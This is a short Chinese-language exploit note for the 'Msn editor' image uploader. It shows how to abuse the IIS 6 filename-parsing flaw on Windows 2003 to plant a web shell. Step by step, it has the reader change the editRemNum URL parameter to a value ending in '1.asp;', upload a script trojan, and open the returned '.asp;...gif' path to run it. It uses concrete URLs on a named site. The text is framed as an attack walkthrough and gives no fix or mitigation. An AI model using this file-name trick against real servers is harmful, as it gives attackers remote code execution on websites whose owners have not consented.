## Msn editor

### 利用WIN 2003 IIS文件名称解析漏洞获得SHELL

影响版本：未知
脆弱描述：
点击图片上传后会出现上传页面，地址为
http://navisec.it/admin/uploadPic.asp?language=&editImageNum=0&editRemNum=
用普通的图片上传后，地址为
http://navisec.it/news/uppic/41513102009204012_1.gif
记住这时候的路径，再点击图片的上传，这时候地址就变成了
http://navisec.it/news/admin/uploadPic.asp?language=&editImageNum=1&editRemNum=41513102009204012
很明显。图片的地址是根据RemNum后面的编号生成的。
攻击利用:
配合IIS的解析漏洞，把RemNum后面的数据修改为1.asp;41513102009204012，变成下面这个地址
http://navisec.it/admin/uploadPic.asp?language=&editImageNum=0&editRemNum=1.asp;41513102009204012
然后在浏览器里打开，然后选择你的脚本木马上传，将会返回下面的地址
uppic/1.asp;41513102009204012_2.gif
直接打开就是我们的小马地址！